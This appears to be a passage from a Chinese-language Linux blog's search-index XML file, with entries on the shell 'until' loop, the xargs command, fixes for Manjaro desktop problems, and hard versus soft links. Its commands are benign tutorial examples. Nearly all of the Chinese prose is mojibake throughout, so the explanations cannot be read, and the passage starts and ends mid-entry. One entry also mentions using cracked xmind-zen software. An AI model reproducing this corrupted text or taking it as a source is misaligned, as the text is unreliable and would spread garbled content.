æ‰ä¼šæ‰§è¡Œå¾ªç¯ä¸­åˆ—å‡ºçš„å‘½ä»¤ã€‚ ä¸€æ—¦æµ‹è¯•å‘½ä»¤è¿”å›äº†é€€å‡ºçŠ¶æ€ç 0ï¼Œå¾ªç¯å°±ç»“æŸäº†ã€‚</p><p>æ ¼å¼ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">until test commands</span><br><span class="line">do</span><br><span class="line">done</span><br></pre></td></tr></table></figure><h2 id="å¤„ç†å¾ªç¯">å¤„ç†å¾ªç¯</h2><ol type="1"><li><code>break</code>å’Œ <code>continue</code>å…³é”®å­—å’Œå…¶ä»–è¯­è¨€ä¸€æ ·ç”¨æ³•</li><li>å¤„ç†å¾ªç¯çš„è¾“å‡º å¯ä»¥å¯¹å¾ªç¯çš„è¾“å‡ºä½¿ç”¨ç®¡é“æˆ–è¿›è¡Œé‡å®šå‘ã€‚è¿™å¯ä»¥é€šè¿‡åœ¨done å‘½ä»¤ä¹‹åæ·»åŠ ä¸€ä¸ªå¤„ç†å‘½ä»¤æ¥å®ç°ã€‚</li></ol><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><blockquote><ol type="1"><li>Linux å‘½ä»¤è¡Œä¸ Shell è„šæœ¬ç¼–ç¨‹å¤§å…¨</li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> shell </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>xargs å‘½ä»¤</title>
      <link href="/blog/2020/08/01/linux/tools/xargs/"/>
      <url>/blog/2020/08/01/linux/tools/xargs/</url>
      
        <content type="html"><![CDATA[<blockquote><p>æœ¬æ–‡ä¸»è¦ç¿»è¯‘è‡ª <a href="https://shapeshed.com/unix-xargs/">Linux andUnix xargs command tutorial with examples</a></p></blockquote><h2 id="ç®€ä»‹">ç®€ä»‹</h2><p><code>xargs</code> å‘½ä»¤ç”¨äºä»æ ‡å‡†è¾“å…¥ä¸­æ„å»ºæ‰§è¡Œç®¡é“å’Œæ‰§è¡Œå‘½ä»¤è¡Œã€‚åƒ<code>grep</code> å‘½ä»¤ç­‰å¯ä»¥ä»æ¥å—ç®¡é“è¾“å…¥ä½œä¸ºå‚æ•°ï¼Œè€Œå…¶ä»–å·¥å…·ï¼Œåƒ<code>echo</code>, <code>rm</code>, <code>mkdir</code>, <code>ls</code>ç­‰å´ä¸èƒ½ã€‚æˆ‘ä»¬å¯ä»¥å€ŸåŠ© xargs æ¥ä½¿ä»–ä»¬æ¥å—ç®¡é“è¾“å…¥ä½œä¸ºå‚æ•°ã€‚</p><h2 id="ä½¿ç”¨">ä½¿ç”¨</h2><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œ<code>xargs</code>ä»ç”±ç©ºæ ¼åˆ†éš”çš„æ ‡å‡†è¾“å…¥ä¸­è¯»å–é¡¹ï¼Œå¹¶å¯¹æ¯ä¸ªå‚æ•°æ‰§è¡Œä¸€æ¬¡å‘½ä»¤ã€‚</p><p>ä¸‹é¢ä¾‹å­ä¸­é€šè¿‡ç®¡é“å°†æ ‡å‡†è¾“å…¥ä¼ é€’ç»™<code>xargs</code>ï¼Œç„¶åå®ƒæ‰§è¡Œæ¯ä¸ªå‚æ•°ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="string">&quot;one two three&quot;</span> | xargs <span class="built_in">mkdir</span></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span></span></span><br><span class="line">one  three  two</span><br></pre></td></tr></table></figure><h2 id="xargs-ä¸-find-é…åˆä½¿ç”¨">xargs ä¸ find é…åˆä½¿ç”¨</h2><p><code>xrags</code> æœ€å¸¸è§çš„ç”¨æ³•å°±æ˜¯å’Œ <code>find</code>ä¸€èµ·ä½¿ç”¨ã€‚ä¸€èˆ¬æ˜¯ä½¿ç”¨ <code>find</code> æ¥æœç´¢æ–‡ä»¶å’Œç›®å½•ï¼Œç„¶åä½¿ç”¨<code>xargs</code> æ¥å¤„ç†ç»“æœã€‚å…¸å‹çš„ä¾‹å­æ˜¯æ”¹å˜æ‰€æœ‰æƒæˆ–è€…ç§»åŠ¨æ–‡ä»¶ã€‚</p><p>ä¸‹é¢ä¾‹å­ä¸­ï¼ŒæŸ¥æ‰¾ 2 å‘¨ä»¥å‰çš„æ–‡ä»¶ï¼Œç„¶åé€šè¿‡ç®¡é“å°†ç»“æœä¼ ç»™<code>xargs</code> æ¥è¿›è¡Œåˆ é™¤æ“ä½œã€‚</p><p><code>sudo find /tmp -mtime +10|xargs rm -f</code></p><p>æŠ¥é”™æç¤ºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo find /tmp -mtime +10|xargs <span class="built_in">rm</span></span></span><br><span class="line">rm: missing operand</span><br><span class="line">Try &#x27;rm --help&#x27; for more information.</span><br></pre></td></tr></table></figure><p>åŸå› ï¼š <code>find</code> æŸ¥æ‰¾çš„ç»“æœé›†ä¸ºç©ºï¼Œå¯¼è‡´ <code>rm</code>æ¥å—åˆ°ç©ºå‚æ•°</p><h2 id="xargs-v-exec">xargs v exec</h2><p><code>find</code> å‘½ä»¤æ”¯æŒ -exec é€‰é¡¹æ¥å¯¹ç»“æœæ‰§è¡Œä»»æ„çš„æ“ä½œã€‚</p><p>ä¸‹é¢ä¸¤ä¸ªç‰ˆæœ¬çš„æ•ˆæœæ˜¯ä¸€è‡´çš„ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find ./foo -type f -name &quot;*.txt&quot; -exec rm -f &#123;&#125; \;</span><br><span class="line">find ./foo -type f -name &quot;*.txt&quot; | xargs rm -f</span><br></pre></td></tr></table></figure><p>ä¸€äº›æµ‹è¯•ï¼ˆè§æ–‡æœ«å‚è€ƒèµ„æ–™ï¼‰è¡¨ç¤º <code>xargs</code> æ¯”<code>exec &#123;&#125;</code> å¿«å…­å€</p><h2 id="æ‰“å°æ‰§è¡Œçš„å‘½ä»¤">æ‰“å°æ‰§è¡Œçš„å‘½ä»¤</h2><p><code>-t</code> é€‰é¡¹æ‰“å°æ¯ä¸€æ¡å°†ä¼šåœ¨ç»ˆç«¯æ‰§è¡Œçš„å‘½ä»¤ã€‚</p><p>ä¾‹å¦‚ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="string">&#x27;one two three&#x27;</span> | xargs -t <span class="built_in">rm</span> -rf</span></span><br><span class="line">rm -rf one two three</span><br></pre></td></tr></table></figure><h2 id="æ‰“å°å¹¶æç¤ºè¯¢é—®å‘½ä»¤">æ‰“å°å¹¶æç¤ºè¯¢é—®å‘½ä»¤</h2><p><code>-p</code> é€‰é¡¹ä¼šæ‰“å°è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œå¹¶æç¤ºç”¨æˆ·æ˜¯å¦æ‰§è¡Œ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="string">&#x27;one two three&#x27;</span> | xargs -p <span class="built_in">touch</span></span></span><br><span class="line">touch one two three ?...y</span><br></pre></td></tr></table></figure><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><blockquote><ol type="1"><li><a href="https://shapeshed.com/unix-xargs/">Linux and Unix xargscommand tutorial with examples</a></li><li><ahref="https://stackoverflow.com/questions/36617999/error-rm-missing-operand-when-using-along-with-find-command/36618260">Error'rm: missing operand' when using along with 'find' command</a></li><li><ahref="https://www.everythingcli.org/find-exec-vs-find-xargs/">find -execvs. find | xargs</a></li><li><a href="https://danielmiessler.com/blog/linux-xargs-vs-exec/">xargsvs. exec {}</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> tools </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Manjaro ä½¿ç”¨é—®é¢˜æ±‡æ€»</title>
      <link href="/blog/2020/07/24/linux/manjaro/manjaro_issues/"/>
      <url>/blog/2020/07/24/linux/manjaro/manjaro_issues/</url>
      
        <content type="html"><![CDATA[<h2 id="å¿½ç•¥åŒ…æ›´æ–°">å¿½ç•¥åŒ…æ›´æ–°</h2><p>é…ç½®æ–‡ä»¶ <code>/etc/pacman.conf</code> ä¸­çš„ <code>IgnorePkg</code>é‚£é‡Œå†™ä¸Šä½ å¸Œæœ›å¿½ç•¥æ›´æ–°çš„åŒ…ã€‚ä¾‹å¦‚æˆ‘å¿½ç•¥äº†<code>xmind-zen</code>ï¼ˆå› ä¸ºæˆ‘ç”¨çš„æ˜¯æœå£³ç ´è§£çš„ï¼Œæ€•æ›´æ–°åå°±å¤±æ•ˆäº†ã€‚ï¼‰</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">grep -n  <span class="string">&quot;IgnorePkg&quot;</span> /etc/pacman.conf</span></span><br><span class="line">28:# Pacman won&#x27;t upgrade packages listed in IgnorePkg and members of IgnoreGroup</span><br><span class="line">29:IgnorePkg   = xmind-zen</span><br></pre></td></tr></table></figure><h2 id="fcitx-è‹±æ–‡è¡¥å…¨">fcitx è‹±æ–‡è¡¥å…¨</h2><ol type="1"><li><p>æ¿€æ´»åˆ°å¹¶ä¸”è¿›å…¥ Fcitx çš„è‹±æ–‡è¾“å…¥çŠ¶æ€,ç‚¹å‡»ä»»æ„è¾“å…¥æ¡†. 2.æŒ‰ctrl+alt+H ,ä»¥æ¿€æ´» spell hint çŠ¶æ€.3.è¾“å…¥å‡ ä¸ªè‹±æ–‡å­—æ¯,å³å¯å¼¹å‡ºå€™é€‰å•è¯(å³è‡ªåŠ¨è¡¥å…¨åŠŸèƒ½), å¯ä»¥æŒ‰ altåŠ æ•°å­—,ä»¥é€‰å–å€™é€‰å•è¯.</p></li><li><p>ä¸ºäº†ä»¤è¡¥å…¨åŠŸèƒ½æ›´è´´å¿ƒ,å¯ä»¥åœ¨ fcitx è®¾ç½®é‡Œçš„æ‰¾åˆ°"English"(è¾“å…¥æ³•)ä¸€æ ,åŒå‡»,è¿›å…¥å¯æœ‰æ›´å¤šè®¾ç½®. æ¯”å¦‚æŠŠ "choose keymodifier"ç”± alt æ”¹æˆ none ,ä½œç”¨ï¼šä¸ç”¨æŒ‰Alt+åºå·ï¼Œè€Œæ˜¯ç›´æ¥æŒ‰åºå·å³å¯é€‰è¯ã€‚</p></li></ol><h2 id="æ¡Œé¢æ„å¤–å¢åŠ ä¾¿ç­¾">æ¡Œé¢æ„å¤–å¢åŠ ä¾¿ç­¾</h2><p>å…¶å®è¿™ä¸ªä¸æ˜¯ libinput-gesturesçš„é—®é¢˜ã€‚æ‰¾äº†åŠå¤©ï¼Œæˆ‘å‘ç°æ˜¯é¼ æ ‡ä¸­é”®è§¦å‘äº†æ·»åŠ ä¾¿ç­¾ï¼Œè€Œä¸‰æŒ‡ç‚¹å‡»æ˜¯ manjaroè‡ªå¸¦çš„è§¦æ‘¸æ¿æ‰‹åŠ¿ä¸­é”®ã€‚äºæ˜¯å³é”®æ¡Œé¢é…ç½®æ¡Œé¢ â†’é¼ æ ‡åŠ¨ä½œï¼Œåˆ é™¤ä¸­é—´åŠ¨ä½œå³å¯ã€‚</p><h2 id="teamviewer-æ— æ³•ä½¿ç”¨">teamviewer æ— æ³•ä½¿ç”¨</h2><p>æ˜¾ç¤º <code>Not ready. Please check your connection</code></p><p>è§£å†³æ–¹æ³•ï¼š é¦–æ¬¡å®‰è£…åï¼Œé‡å¯ç”µè„‘ï¼Œç„¶å <code>su root</code> åˆ‡æ¢åˆ°root æ¨¡å¼ï¼Œå‘½ä»¤è¡Œå¯åŠ¨å³å¯ã€‚</p><p>å‚è€ƒï¼š<a href="https://www.cnblogs.com/kunx/p/9158153.html">manjaroå®‰è£… teamviewer åæ— æ³•æ‰“å¼€</a></p><h2 id="deepin-tim-å„ç§é—®é¢˜">deepin tim å„ç§é—®é¢˜</h2><ol type="1"><li><p>manjaro kde ä¸Š tim å¡æ­»</p><p>è§£å†³æ–¹æ¡ˆï¼š å¸è½½ä½ ä¹‹å‰å¯¼å…¥çš„ windows çš„å…¨éƒ¨å­—ä½“</p><p><ahref="https://github.com/countstarlight/deepin-wine-tim-arch/issues/49">manjarokde ä¸Šä¸å¯ç”¨ï¼Œå¯åŠ¨æ…¢+å‹‰å¼ºå¯åŠ¨å¡æ­» #49</a></p><p>KDE æ¡Œé¢ç›®å‰å­˜åœ¨ä¸èƒ½è®°ä½å¯†ç çš„é—®é¢˜ã€‚</p><p>æˆ‘çš„ Manjaro KDE åªèƒ½ä½¿ç”¨ wine,ä¸èƒ½ä½¿ç”¨deepin-wine,ä¸€åˆ‡æ¢å°±å¡æ­»ã€‚</p></li><li><p>å­—ä½“å‘è™šï¼Œä¸­æ–‡æ–¹æ¡†ï¼Œæ‰“ä¸å¼€ï¼Œè°ƒ dpi ç­‰ï¼Œè§£å†³æ–¹æ³•è§ï¼š</p><p><a href="https://github.com/countstarlight/deepin-wine-tim-arch">åœ¨Archlinux åŠè¡ç”Ÿå‘è¡Œç‰ˆä¸Šè¿è¡Œ TIM</a></p></li><li><p>å›¾ç‰‡ä¸€ç›´åŠ è½½ï¼Œä¸æ˜¾ç¤º</p><p><a href="https://www.4gml.com/thread-53.htm">Arch || Manjaro ç¦ç”¨IPV6</a></p></li></ol><h3 id="kde-æ¡Œé¢-deepin-wine-ä¸­ç„¦ç‚¹çš„é—®é¢˜">kde æ¡Œé¢ deepin wineä¸­ç„¦ç‚¹çš„é—®é¢˜</h3><p>ç›®å‰ manjaro kde ä¸‹ <code>deepin-wine-tim</code>å³é”®ä¸èƒ½é¼ æ ‡é€‰ä¸­åŠŸèƒ½ï¼Œå› æ­¤å¤åˆ¶ï¼Œ@ï¼Œæ’¤å›ï¼Œå›å¤æŸä¸ªäººæ¶ˆæ¯éƒ½ä¸è¡Œã€‚</p><p>ä¸´æ—¶æ›¿ä»£ï¼šå³é”®ä¹‹åï¼Œä¸è¦é¼ æ ‡ç‚¹å‡»ï¼Œè€Œæ˜¯è¦é€šè¿‡é”®ç›˜ä¸Šä¸‹é”®å’Œå›è½¦æ¥è¿›è¡Œã€‚</p><p>æ­¤è§£å†³æ–¹æ¡ˆæ¥è‡ª Arch linux QQç¾¤çš„æ†‹æ†‹å¤§ä½¬ï¼Œè¡¨ç¤ºæ„Ÿè°¢ï¼ˆè™½ç„¶ä»–å¯èƒ½çœ‹ä¸è§ï¼‰ï¼Œ QQ ç¾¤å·ï¼š204097403</p><h2 id="å­—ä½“">å­—ä½“</h2><h3 id="manjaro-å­—ä½“å°">manjaro å­—ä½“å°</h3><ol type="1"><li>font é‚£é‡Œè°ƒ dpi</li><li>display é‚£é‡Œè°ƒ scaleï¼Œkonsole æ‰“å­—æˆ–é€‰ä¸­å‡ºç°ç™½çº¿ KDE çš„ bugï¼šä¸è¦å»<code>Settings -&gt; Displays and Monitor</code> é‚£é‡Œè°ƒèŠ‚ç³»ç»Ÿçš„DPIï¼Œå¦åˆ™ Konsole å°±ä¼šå‡ºç°æ–œçº¿ã€‚</li></ol><h3 id="chrome-ui-å­—ä½“å°">chrome ui å­—ä½“å°</h3><p>é¦–å…ˆï¼Œç›¸å…³ç‰ˆæœ¬ä¿¡æ¯ï¼š</p><ol type="1"><li>chrome ç‰ˆæœ¬: Version 83.0.4103.61 (Official Build) (64-bit),</li><li>OS: Manjaro 20.0.1 Lysia</li><li>DE: KDE 5.70.0 / Plasma 5.18.5</li></ol><p>æ³¨æ„: æ˜¯ chrome ui ï¼ˆbookmarksã€address bar ç­‰ï¼‰ï¼Œè€Œä¸æ˜¯ chromeæ¸²æŸ“çš„ç½‘é¡µï¼Œåè€…å¯ä»¥å† setting ä¸­å¾ˆå®¹æ˜“è®¾ç½®ã€‚ å‰è€…çš„è°ƒèŠ‚æ–¹æ³•:</p><ol type="1"><li><p>æŸ¥çœ‹ä¸€ä¸‹ chrome å¯åŠ¨æ–‡ä»¶</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span>  /usr/bin/google-chrome-stable</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Allow <span class="built_in">users</span> to override command-line options</span></span><br><span class="line">if [[ -f ~/.config/chrome-flags.conf ]]; then</span><br><span class="line">   CHROME_USER_FLAGS=&quot;$(cat ~/.config/chrome-flags.conf)&quot;</span><br><span class="line">fi</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Launch</span></span><br><span class="line">exec /opt/google/chrome/google-chrome $CHROME_USER_FLAGS &quot;$@&quot;%</span><br></pre></td></tr></table></figure></p><p>æ³¨æ„åˆ°:<code># Allow users to override command-line options</code>ä»¥åŠä¸‹é¢çš„æ–‡ä»¶</p></li><li><p>åˆ›å»º <code>~/.config/chrome-flags.conf</code> è¯¥æ–‡ä»¶ï¼Œå¹¶å†™å…¥<code>--force-device-scale-factor=n</code> å…¶ä¸­ï¼Œ <code>n</code>ç”±ä½ è‡ªå®šä¹‰ï¼Œå¯ä¸ºå°æ•°ã€‚æˆ‘è®¾ç½®ä¸ºäº† <code>1.2</code>, ä½ å¯ä»¥è®¾ç½®ä¸€ä¸‹nï¼Œé‡å¯ chromeï¼Œè§‚å¯Ÿå¤§å°ï¼Œä»è€Œç¡®å®šé€‚åˆä½ çš„ n å€¼ã€‚</p></li></ol><p>å‚è€ƒ: <ahref="https://superuser.com/questions/1116767/chrome-ui-size-zoom-levels-in-ubuntu-16-04">ChromeUI size &amp; zoom levels in Ubuntu 16.04</a></p><h2 id="master-pdf-ä¸­æ–‡æ˜¾ç¤ºè¾“å…¥ä»¥åŠç¼–è¾‘ä¸­æ–‡æ—¶ç©ºç™½">master pdfä¸­æ–‡æ˜¾ç¤ºï¼Œè¾“å…¥ä»¥åŠç¼–è¾‘ä¸­æ–‡æ—¶ï¼Œç©ºç™½</h2><ol type="1"><li><p>ç¡®ä¿å®‰è£…å¥½äº†å¸¸ç”¨ä¸­æ–‡å­—ä½“,æ•™ç¨‹å¦‚ä¸‹ <ahref="https://blog.frytea.com/archives/296/">ä¸º Linuxå‘è¡Œç‰ˆå®‰è£…ä¸­æ–‡å­—ä½“</a></p></li><li><p>"Tools -&gt; Settings -&gt; Editing" <imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200806184959.png"alt="config" /></p><p>è¿™äº†è¿™ä¸¤æ­¥éª¤ï¼Œåœ¨ç¼–è¾‘ä¸­æ–‡çš„æ—¶å€™ï¼Œå°±åŸºæœ¬å¯ä»¥äº†ã€‚</p></li><li><p>Error "This font doesnâ€™t contain these characters. Try choosinganother font." when editing text.</p><p><ahref="https://code-industry.net/masterpdfeditor-help/possible-issues-with-text/">PossibleIssues with Text</a></p></li></ol><h2 id="manjaro20.0-è¿æ¥-eduroam-wifi">manjaro20.0 è¿æ¥ eduroamwifi</h2><p>é…ç½®å¦‚ä¸‹ï¼š</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200612162738.png"alt="link_eduroam" /><figcaption aria-hidden="true">link_eduroam</figcaption></figure><p>ç„¶åï¼Œè¿æ¥ eduroam åï¼Œå¼¹å‡ºä¸€æ¬¡æ¡†ï¼Œå†è¾“å…¥ä¸€æ¬¡å›¾ç‰‡ä¸­ Passwordå¯¹åº”è¾“å…¥çš„å€¼ã€‚</p><p>å‚è€ƒé“¾æ¥ï¼š <ahref="https://www.monash.edu/esolutions/network/connect-eduroam-linux">monashConnect to eduroam wi-fi: Linux</a></p><h2 id="çœŸæ— çº¿è“ç‰™è€³æœº">çœŸæ— çº¿è“ç‰™è€³æœº</h2><p>è“ç‰™é…å¯¹ã€è¿æ¥æˆåŠŸï¼Œå¯æ˜¯å£°éŸ³è¿˜æ˜¯å¤–æ”¾ã€‚é‡å¤é…å¯¹ã€è¿æ¥ï¼Œå¶å°”è“ç‰™å†…æ”¾ï¼Œä½†æ˜¯ä¸€å¬æ­Œï¼Œå°±åˆå¤–æ”¾äº†ã€‚</p><p>è§£å†³ï¼š</p><ol type="1"><li><p><ahref="https://wiki.archlinux.org/index.php/Bluetooth#Installation">archwiki Bluetooth</a> æŒ‰ç…§å‰ä¸¤æ­¥å®‰è£…ï¼Œç„¶åé‡å¯äº†è“ç‰™<code>sudo systemctl restart bluetooth.service</code>ï¼Œå†è¿›è¡Œè¿æ¥ï¼ˆå¦‚æœæ­¤æ—¶æ­£å¸¸äº†ï¼Œå°±ä¸ç”¨ä¸‹ä¸€æ­¥äº†ï¼‰</p><p><ahref="https://blog.csdn.net/weixin_30460489/article/details/101312239">archlinuxè“ç‰™è€³æœºæ²¡æœ‰å£°éŸ³</a> æŠŠè¾“å‡ºçš„é»˜è®¤æµè®¾ç½®ä¸ºè“ç‰™ã€‚</p></li><li><p>ç»è¿‡ç¬¬äºŒéƒ¨ä¹‹åï¼Œè¿æ¥ä¸Šäº†ï¼Œä½†æ˜¯è¿˜æ˜¯å¤–æ”¾ã€‚è§£å†³ï¼šæ¯æ¬¡è¿æ¥ä¸Šè“ç‰™ä¹‹åï¼Œå†å¯åŠ¨ï¼ˆå³ï¼šé‡å¯ï¼‰ä½ ç”¨çš„éŸ³è§†é¢‘æ’­æ”¾è½¯ä»¶ï¼Œå¦‚ï¼švlcï¼Œspotifyã€neteaseç­‰ï¼Œå°±å¯ä»¥äº†ã€‚</p></li></ol><h2 id="å£°éŸ³">å£°éŸ³</h2><h2 id="manjaro-æ²¡æœ‰å£°éŸ³äº†">manjaro æ²¡æœ‰å£°éŸ³äº†</h2><p>ä¸€æ¡å‘½ä»¤ï¼š<code>systemctl --user restart pulseaudio.service</code></p><p>åº”è¯¥æ˜¯æ•´ä¸Šé¢çš„è€³æœºé…ç½®æ•´çš„ï¼Œä¸å°å¿ƒæŠŠè¿™ä¸ªæœåŠ¡å…³é—­äº† emm</p><p>å‚è€ƒï¼š</p><p><ahref="https://blog.csdn.net/qq_43497702/article/details/104370104">Manjaroæ²¡æœ‰å£°éŸ³(ä¼ªè¾“å‡º)æ€ä¹ˆåŠ</a></p><h2 id="å£°éŸ³å°">å£°éŸ³å°</h2><p>åœ¨æ¡Œé¢å³ä¸Šè§’ï¼ˆä»¿ Mac é¡¶éƒ¨æ ï¼‰æˆ–è€…å³ä¸‹è§’ï¼ˆç±» Windowsä»»åŠ¡æ ï¼‰ï¼Œæ‰¾å°å–‡å­</p><p>ä¹‹å‰å¯ä»¥åœ¨ä¸‹å›¾ç®­å¤´ 1æŒ‡å‘çš„é‚£é‡Œè¿›å…¥è®¾ç½®ï¼Œç„¶åæ°¸ä¹…è®¾ç½®æœ€å¤§éŸ³é‡çš„ã€‚æœ€è¿‘å¥½åƒå‡çº§æ”¹äº†ï¼Œåªå‰©ä¸‹ç®­å¤´2 é‚£é‡Œçš„å‹¾é€‰ <code>Raise maximum volume</code>ï¼Œå‹¾é€‰åæœ€å¤§éŸ³é‡å˜ä¸º150%ï¼Œå¦‚å›¾:</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200724105146.png"alt="20200724105146" /><figcaption aria-hidden="true">20200724105146</figcaption></figure><p><ahref="ä¹‹å‰çš„è®¾ç½®æ–¹æ³•ï¼šhttps://forum.manjaro.org/t/need-more-volume/57555">Needmore volume</a></p><h2 id="ark-è§£å‹ä¸­æ–‡ä¹±ç ">ark è§£å‹ä¸­æ–‡ä¹±ç </h2><p>Manjaro é»˜è®¤å®‰è£… unarï¼Œè¿™ä¸ªå·¥å…·ä¼šè‡ªåŠ¨æ£€æµ‹æ–‡ä»¶çš„ç¼–ç ï¼Œä¹Ÿå¯ä»¥é€šè¿‡ -eæ¥æŒ‡å®šï¼š å‘½ä»¤è¡Œï¼š<code>unar file.zip</code>ï¼Œ å³å¯è§£å‹å‡ºä¸­æ–‡æ–‡ä»¶</p><h2 id="ntfs-åªè¯»æŒ‚è½½-read-only-file-system">NTFS åªè¯»æŒ‚è½½: â€œRead-onlyfile systemâ€</h2><p>Windows æœªæ­£å¸¸å…³é—­å¯¼è‡´çš„ï¼Œå…³é—­äº† Manjaro, å¼€æœºè¿›å…¥Windowsï¼Œç„¶åæ­£å¸¸å…³æœºï¼Œå†è¿›å…¥ Manjaro å³å¯ã€‚</p><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><blockquote><ol type="1"><li><a href="https://blog.kaaass.net/archives/1205#toc-1">Arch Linux(Manjaro) é…ç½®ä¸å¸¸ç”¨è½¯ä»¶å®‰è£…æŒ‡å—</a></li><li><ahref="https://mrswolf.github.io/zh-cn/2019/05/24/manjaroè¸©å‘è®°/#rslsync">https://mrswolf.github.io/zh-cn/2019/05/24/manjaro%E8%B8%A9%E5%9D%91%E8%AE%B0/#rslsync</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> manjaro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è½¯ç¡¬é“¾æ¥</title>
      <link href="/blog/2020/07/23/linux/tools/links/"/>
      <url>/blog/2020/07/23/linux/tools/links/</url>
      
        <content type="html"><![CDATA[<h2 id="æ–‡ä»¶">æ–‡ä»¶</h2><p>æ–‡ä»¶ç³»ç»Ÿä¸­çš„æ•°æ®åˆ†ä¸ºä¸¤ç±»ï¼Œåˆ†åˆ«æ˜¯ç”¨æˆ·æ•°æ®å’Œå…ƒæ•°æ®ã€‚ ç”¨æˆ·æ•°æ®(userdata)ï¼šæŒ‡æ–‡ä»¶æ•°æ®å— (data block)ï¼Œæ•°æ®å—æ˜¯è®°å½•æ–‡ä»¶çœŸå®å†…å®¹çš„åœ°æ–¹å…ƒæ•°æ®(metadata)ï¼šæŒ‡æ–‡ä»¶çš„é™„åŠ å±æ€§ï¼Œå¦‚æ–‡ä»¶å¤§å°ã€åˆ›å»ºæ—¶é—´ã€æ‰€æœ‰è€…ç­‰ä¿¡æ¯</p><p>åœ¨ Linux ä¸­ï¼Œå…ƒæ•°æ®ä¸­çš„ inode å·ï¼ˆinodeæ˜¯æ–‡ä»¶å…ƒæ•°æ®çš„ä¸€éƒ¨åˆ†ä½†å…¶å¹¶ä¸åŒ…å«æ–‡ä»¶åï¼Œinodeå·å³ç´¢å¼•èŠ‚ç‚¹å·ï¼‰æ‰æ˜¯æ–‡ä»¶çš„å”¯ä¸€æ ‡è¯†è€Œéæ–‡ä»¶åã€‚æ–‡ä»¶åä»…æ˜¯ä¸ºäº†æ–¹ä¾¿äººä»¬çš„è®°å¿†å’Œä½¿ç”¨ï¼Œç³»ç»Ÿæˆ–ç¨‹åºé€šè¿‡inodeå·å¯»æ‰¾æ­£ç¡®çš„æ–‡ä»¶æ•°æ®å—ã€‚ä¸‹å›¾ä¸ºå±•ç¤ºäº†ç¨‹åºé€šè¿‡æ–‡ä»¶åè·å–æ–‡ä»¶å†…å®¹çš„è¿‡ç¨‹ã€‚</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200723213341.png"alt="filename_open_file" /><figcaption aria-hidden="true">filename_open_file</figcaption></figure><h2 id="é“¾æ¥æ–‡ä»¶">é“¾æ¥æ–‡ä»¶</h2><p>ä¸ºè§£å†³æ–‡ä»¶çš„å…±äº«ä½¿ç”¨ï¼ŒLinuxç³»ç»Ÿå¼•å…¥äº†ä¸¤ç§é“¾æ¥ï¼šç¡¬é“¾æ¥å’Œç¬¦å·é“¾æ¥ï¼Œå®ƒä»¬æ˜¯ä¸¤ç§ä¸åŒçš„å¼•ç”¨æ–‡ä»¶çš„æ–¹å¼ã€‚</p><h3 id="è½¯ç¡¬é“¾æ¥åŒºåˆ«">è½¯ç¡¬é“¾æ¥åŒºåˆ«</h3><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200723213446.png"alt="hard_softlink" /><figcaption aria-hidden="true">hard_softlink</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200723220611.png"alt="hard_softlink" /><figcaption aria-hidden="true">hard_softlink</figcaption></figure><h2 